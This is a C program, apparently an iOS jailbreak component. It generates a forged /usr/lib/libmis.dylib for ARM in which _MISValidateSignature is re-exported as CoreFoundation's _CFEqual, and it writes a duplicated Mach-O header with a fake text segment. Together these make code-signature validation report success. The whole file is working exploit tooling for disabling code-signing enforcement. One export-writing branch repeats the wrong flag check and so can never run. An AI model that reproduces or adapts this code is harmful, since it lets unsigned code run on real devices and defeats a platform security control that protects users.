#include <mach-o/loader.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct export_node_child
{
    char* name;

    struct export_node* node;
    struct export_node_child* next_sibling;
    uint64_t offset;
};

struct export_node
{
    int has_data;

    uint64_t flags;

    uint64_t offset;

    uint64_t ordinal;
    char* symbol;

    uint64_t stub_offset;
    uint64_t resolver_offset;

    struct export_node_child* first_child;
};

void add_export_node_child(struct export_node* root, const char* name, const struct export_node* node)
{
    struct export_node* allocated_node = (struct export_node*) malloc(sizeof(struct export_node));
    struct export_node_child* child = (struct export_node_child*) malloc(sizeof(struct export_node_child));

    child->name = strdup(name);
    child->node = allocated_node;
    child->next_sibling = root->first_child;
    child->offset = 0;

    root->first_child = child;

    allocated_node->has_data = node->has_data;
    allocated_node->flags = node->flags;
    allocated_node->offset = node->offset;
    allocated_node->ordinal = node->ordinal;

    if(node->symbol)
        allocated_node->symbol = strdup(node->symbol);
    else
        allocated_node->symbol = NULL;

    allocated_node->stub_offset = 0;
    allocated_node->resolver_offset = 0;
    allocated_node->first_child = NULL;
}

void destroy_export_node(struct export_node* root)
{
    struct export_node_child* child = root->first_child;
    while(child)
    {
        struct export_node_child* next_child = child->next_sibling;

        destroy_export_node(child->node);
        free(child->name);
        free(child);

        child = next_child;
    }

    if(root->symbol)
        free(root->symbol);

    free(root);
}

struct memory_buffer
{
    void* data;
    size_t size;
    size_t capacity;
};

struct memory_buffer* new_memory_buffer()
{
    struct memory_buffer* buffer = (struct memory_buffer*) malloc(sizeof(struct memory_buffer));
    memset(buffer, 0, sizeof(struct memory_buffer));
    return buffer;
}

void destroy_memory_buffer(struct memory_buffer* buffer)
{
    free(buffer->data);
    free(buffer);
}

void write_memory_buffer(struct memory_buffer* buffer, const void* data, size_t size)
{
    size_t new_capacity = buffer->capacity;
    while(new_capacity < (buffer->size + size))
    {
        if(new_capacity == 0)
            new_capacity = 1;
        else
            new_capacity = new_capacity * 2;
    }

    if(new_capacity != buffer->capacity)
    {
        buffer->capacity = new_capacity;
        buffer->data = realloc(buffer->data, new_capacity);
    }

    memcpy(buffer->data + buffer->size, data, size);
    buffer->size += size;
}

size_t write_uleb128(struct memory_buffer* buffer, uint64_t n)
{
    uint8_t buf[16];
    size_t byte_count = 0;
    do
    {
        buf[byte_count++] = n | 0x80;
        n >>= 7;
    } while(n);

    buf[byte_count-1] &= ~0x80;
    write_memory_buffer(buffer, buf, byte_count);
    return byte_count;
}

size_t write_uint8(struct memory_buffer* buffer, uint8_t n)
{
    write_memory_buffer(buffer, &n, sizeof(n));
    return sizeof(n);
}

size_t write_string(struct memory_buffer* buffer, const char* str)
{
    size_t len = strlen(str) + 1;
    write_memory_buffer(buffer, str, len);
    return len;
}

size_t uleb128_size(uint64_t n)
{
    size_t byte_count = 0;
    do
    {
        ++byte_count;
        n >>= 7;
    } while(n);
    return byte_count;
}

uint64_t update_export_node_offsets(struct export_node* root, uint64_t offset)
{
    size_t info_size = 0;
    if(root->has_data)
    {
        info_size += uleb128_size(root->flags);

        if((root->flags & EXPORT_SYMBOL_FLAGS_REEXPORT))
        {
            info_size += uleb128_size(root->ordinal) + strlen(root->symbol) + 1;
        } else if((root->flags & EXPORT_SYMBOL_FLAGS_REEXPORT))
        {
            info_size += uleb128_size(root->stub_offset) + uleb128_size(root->resolver_offset);
        } else
        {
            info_size += uleb128_size(root->offset);
        }
    }

    offset += uleb128_size(info_size);

    if(root->has_data)
    {
        offset += info_size;
    }

    offset += 1;

    while(1)
    {
        uint64_t child_offsets = offset;
        int updated = 0;

        struct export_node_child* child = root->first_child;
        while(child)
        {
            child_offsets += strlen(child->name) + 1 + uleb128_size(child->offset);
            child = child->next_sibling;
        }

        uint64_t next_child_offset = child_offsets;
        child = root->first_child;
        while(child != NULL)
        {
            if(child->offset != next_child_offset)
            {
                child->offset = next_child_offset;
                updated = 1;
                break;
            }

            next_child_offset = update_export_node_offsets(child->node, next_child_offset);
            child = child->next_sibling;
        }

        if(updated)
            continue;

        offset = next_child_offset;
        break;
    }

    return offset;
}

size_t write_export_node(struct memory_buffer* buffer, struct export_node* root)
{
    size_t size = 0;

    if(root->has_data)
    {
        if((root->flags & EXPORT_SYMBOL_FLAGS_REEXPORT))
        {
            write_uleb128(buffer, uleb128_size(root->flags) + uleb128_size(root->ordinal) + strlen(root->symbol) + 1);
        } else if((root->flags & EXPORT_SYMBOL_FLAGS_REEXPORT))
        {
            write_uleb128(buffer, uleb128_size(root->flags) + uleb128_size(root->stub_offset) + uleb128_size(root->resolver_offset));
        } else
        {
            write_uleb128(buffer, uleb128_size(root->flags) + uleb128_size(root->offset));
        }

        size += write_uleb128(buffer, root->flags);
    } else
    {
        write_uleb128(buffer, 0);
    }

    if(root->has_data)
    {
        if((root->flags & EXPORT_SYMBOL_FLAGS_REEXPORT))
        {
            size += write_uleb128(buffer, root->ordinal);
            size += write_string(buffer, root->symbol);
        } else if((root->flags & EXPORT_SYMBOL_FLAGS_REEXPORT))
        {
            size += write_uleb128(buffer, root->stub_offset);
            size += write_uleb128(buffer, root->resolver_offset);
        } else
        {
            size += write_uleb128(buffer, root->offset);
        }
    }

    uint8_t children = 0;
    struct export_node_child* child = root->first_child;
    while(child)
    {
        ++children;
        child = child->next_sibling;
    }

    size += write_uint8(buffer, children);

    child = root->first_child;
    while(child)
    {
        size += write_string(buffer, child->name);
        size += write_uleb128(buffer, child->offset);
        child = child->next_sibling;
    }

    child = root->first_child;
    while(child)
    {
        size += write_export_node(buffer, child->node);
        child = child->next_sibling;
    }

    return size;
}

size_t write_export(struct memory_buffer* buffer, struct export_node* root)
{
    update_export_node_offsets(root, 0);
    return write_export_node(buffer, root);
}

int main(int argc, const char* argv[])
{
    const char* library_to_load = "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation";
    const char* library_to_fake = "/usr/lib/libmis.dylib";

    struct export_node* root = (struct export_node*) malloc(sizeof(struct export_node));;
    memset(root, 0, sizeof(struct export_node));

    struct export_node reexport;

    memset(&reexport, 0, sizeof(reexport));
    reexport.has_data = 1;
    reexport.flags = EXPORT_SYMBOL_FLAGS_REEXPORT;
    reexport.ordinal = 1;
    reexport.symbol = "_CFEqual";
    add_export_node_child(root, "_MISValidateSignature", &reexport);

    memset(&reexport, 0, sizeof(reexport));
    reexport.has_data = 1;
    reexport.flags = EXPORT_SYMBOL_FLAGS_REEXPORT;
    reexport.ordinal = 1;
    reexport.symbol = "_kCFUserNotificationTimeoutKey";
    add_export_node_child(root, "_kMISValidationOptionExpectedHash", &reexport);

    memset(&reexport, 0, sizeof(reexport));
    reexport.has_data = 1;
    reexport.flags = EXPORT_SYMBOL_FLAGS_REEXPORT;
    reexport.ordinal = 1;
    reexport.symbol = "_kCFUserNotificationTokenKey";
    add_export_node_child(root, "_kMISValidationOptionValidateSignatureOnly", &reexport);

    struct memory_buffer* export_buffer = new_memory_buffer();
    write_export(export_buffer, root);

    size_t linkedit_size = export_buffer->size;

    struct mach_header header;
    struct segment_command text_segment;
    struct segment_command fake_text_segment;
    struct segment_command linkedit_segment;
    struct symtab_command symtab;
    struct dysymtab_command dysymtab;
    struct dyld_info_command dyld_info;
    struct dylib_command dylib_id;
    struct dylib_command dylib_load;

    size_t dylib_id_size = ((sizeof(dylib_id) + strlen(library_to_fake) + 3) / 4) * 4;
    size_t dylib_load_size = ((sizeof(dylib_load) + strlen(library_to_load) + 3) / 4) * 4;
    size_t commands_size = sizeof(text_segment) + sizeof(fake_text_segment) + sizeof(linkedit_segment) + sizeof(symtab) + sizeof(dysymtab) + sizeof(dyld_info) + dylib_id_size + dylib_load_size;
    size_t header_size = sizeof(header) + commands_size;

    size_t text_segment_vmsize = ((header_size + PAGE_SIZE - 1) / PAGE_SIZE) * PAGE_SIZE;
    size_t linkedit_segment_vmsize = ((linkedit_size + PAGE_SIZE - 1) / PAGE_SIZE) * PAGE_SIZE;

    uint32_t real_header_offset = ((text_segment_vmsize + linkedit_size + PAGE_SIZE - 1) / PAGE_SIZE) * PAGE_SIZE;

    header.magic = MH_MAGIC;
    header.cputype = CPU_TYPE_ARM;
    header.cpusubtype = CPU_SUBTYPE_ARM_ALL;
    header.filetype = MH_DYLIB;
    header.ncmds = 8;
    header.sizeofcmds = commands_size;
    header.flags = MH_NOUNDEFS | MH_DYLDLINK | MH_TWOLEVEL | MH_NO_REEXPORTED_DYLIBS;

    text_segment.cmd = LC_SEGMENT;
    text_segment.cmdsize = sizeof(text_segment);
    strncpy(text_segment.segname, "__TEXT", sizeof(text_segment.segname));
    text_segment.vmaddr = 0;
    text_segment.vmsize = text_segment_vmsize;
    text_segment.fileoff = real_header_offset;
    text_segment.filesize = text_segment_vmsize;
    text_segment.maxprot = VM_PROT_READ;
    text_segment.initprot = VM_PROT_READ;
    text_segment.nsects = 0;
    text_segment.flags = 0;

    fake_text_segment.cmd = LC_SEGMENT;
    fake_text_segment.cmdsize = sizeof(fake_text_segment);
    strncpy(fake_text_segment.segname, "__FAKE_TEXT", sizeof(fake_text_segment.segname));
    fake_text_segment.vmaddr = 0;
    fake_text_segment.vmsize = text_segment_vmsize;
    fake_text_segment.fileoff = 0;
    fake_text_segment.filesize = text_segment_vmsize;
    fake_text_segment.maxprot = VM_PROT_READ | VM_PROT_EXECUTE;
    fake_text_segment.initprot = VM_PROT_READ | VM_PROT_EXECUTE;
    fake_text_segment.nsects = 0;
    fake_text_segment.flags = 0;

    linkedit_segment.cmd = LC_SEGMENT;
    linkedit_segment.cmdsize = sizeof(linkedit_segment);
    strncpy(linkedit_segment.segname, "__LINKEDIT", sizeof(linkedit_segment.segname));
    linkedit_segment.vmaddr = ((text_segment_vmsize + PAGE_SIZE - 1) / PAGE_SIZE) * PAGE_SIZE;
    linkedit_segment.vmsize = linkedit_segment_vmsize;
    linkedit_segment.fileoff = text_segment.filesize;
    linkedit_segment.filesize = linkedit_size;
    linkedit_segment.maxprot = VM_PROT_READ;
    linkedit_segment.initprot = VM_PROT_READ;
    linkedit_segment.nsects = 0;
    linkedit_segment.flags = 0;

    symtab.cmd = LC_SYMTAB;
    symtab.cmdsize = sizeof(symtab);
    symtab.symoff = 0;
    symtab.nsyms = 0;
    symtab.stroff = 0;
    symtab.strsize = 0;

    dysymtab.cmd = LC_DYSYMTAB;
    dysymtab.cmdsize = sizeof(dysymtab);
    dysymtab.ilocalsym = 0;
    dysymtab.nlocalsym = 0;
    dysymtab.iextdefsym = 0;
    dysymtab.nextdefsym = 0;
    dysymtab.iundefsym = 0;
    dysymtab.nundefsym = 0;
    dysymtab.tocoff = 0;
    dysymtab.ntoc = 0;
    dysymtab.modtaboff = 0;
    dysymtab.nmodtab = 0;
    dysymtab.extrefsymoff = 0;
    dysymtab.nextrefsyms = 0;
    dysymtab.indirectsymoff = 0;
    dysymtab.nindirectsyms = 0;
    dysymtab.extreloff = 0;
    dysymtab.nextrel = 0;
    dysymtab.locreloff = 0;
    dysymtab.nlocrel = 0;

    dyld_info.cmd = LC_DYLD_INFO_ONLY;
    dyld_info.cmdsize = sizeof(dyld_info);
    dyld_info.rebase_off = 0;
    dyld_info.rebase_size = 0;
    dyld_info.bind_off = 0;
    dyld_info.bind_size = 0;
    dyld_info.weak_bind_off = 0;
    dyld_info.weak_bind_size = 0;
    dyld_info.lazy_bind_off = 0;
    dyld_info.lazy_bind_size = 0;
    dyld_info.export_off = linkedit_segment.fileoff;
    dyld_info.export_size = export_buffer->size;

    dylib_id.cmd = LC_ID_DYLIB;
    dylib_id.cmdsize = dylib_id_size;
    dylib_id.dylib.name.offset = sizeof(dylib_id);
    dylib_id.dylib.timestamp = 0;
    dylib_id.dylib.current_version = 0x10000;
    dylib_id.dylib.compatibility_version = 0x10000;

    dylib_load.cmd = LC_LOAD_DYLIB;
    dylib_load.cmdsize = dylib_load_size;
    dylib_load.dylib.name.offset = sizeof(dylib_load);
    dylib_load.dylib.timestamp = 0;
    dylib_load.dylib.current_version = 0;
    dylib_load.dylib.compatibility_version = 0xFFFFFFFF;

    uint8_t padding[4096] = { 0 };

    struct memory_buffer* macho_buffer = new_memory_buffer();

    write_memory_buffer(macho_buffer, &header, sizeof(header));
    write_memory_buffer(macho_buffer, &fake_text_segment, sizeof(fake_text_segment));
    write_memory_buffer(macho_buffer, &text_segment, sizeof(text_segment));
    write_memory_buffer(macho_buffer, &linkedit_segment, sizeof(linkedit_segment));
    write_memory_buffer(macho_buffer, &symtab, sizeof(symtab));
    write_memory_buffer(macho_buffer, &dysymtab, sizeof(dysymtab));
    write_memory_buffer(macho_buffer, &dyld_info, sizeof(dyld_info));

    write_memory_buffer(macho_buffer, &dylib_id, sizeof(dylib_id));
    write_memory_buffer(macho_buffer, library_to_fake, strlen(library_to_fake));
    write_memory_buffer(macho_buffer, padding, dylib_id_size - sizeof(dylib_id) - strlen(library_to_fake));

    write_memory_buffer(macho_buffer, &dylib_load, sizeof(dylib_load));
    write_memory_buffer(macho_buffer, library_to_load, strlen(library_to_load));
    write_memory_buffer(macho_buffer, padding, dylib_load_size - sizeof(dylib_load) - strlen(library_to_load));

    write_memory_buffer(macho_buffer, padding, text_segment.filesize - header_size);

    write_memory_buffer(macho_buffer, export_buffer->data, export_buffer->size);

    write_memory_buffer(macho_buffer, padding, real_header_offset - (linkedit_segment.fileoff + linkedit_segment.filesize));

    write_memory_buffer(macho_buffer, &header, sizeof(header));
    write_memory_buffer(macho_buffer, &fake_text_segment, sizeof(fake_text_segment));
    write_memory_buffer(macho_buffer, &text_segment, sizeof(text_segment));
    write_memory_buffer(macho_buffer, &linkedit_segment, sizeof(linkedit_segment));
    write_memory_buffer(macho_buffer, &symtab, sizeof(symtab));
    write_memory_buffer(macho_buffer, &dysymtab, sizeof(dysymtab));
    write_memory_buffer(macho_buffer, &dyld_info, sizeof(dyld_info));

    write_memory_buffer(macho_buffer, &dylib_id, sizeof(dylib_id));
    write_memory_buffer(macho_buffer, library_to_fake, strlen(library_to_fake));
    write_memory_buffer(macho_buffer, padding, dylib_id_size - sizeof(dylib_id) - strlen(library_to_fake));

    write_memory_buffer(macho_buffer, &dylib_load, sizeof(dylib_load));
    write_memory_buffer(macho_buffer, library_to_load, strlen(library_to_load));
    write_memory_buffer(macho_buffer, padding, dylib_load_size - sizeof(dylib_load) - strlen(library_to_load));

    write_memory_buffer(macho_buffer, padding, text_segment.filesize - header_size);

    FILE* f = fopen(argv[1], "wb");
    fwrite(macho_buffer->data, 1, macho_buffer->size, f);
    fclose(f);

    destroy_export_node(root);
    destroy_memory_buffer(export_buffer);
    destroy_memory_buffer(macho_buffer);

    return 0;
}
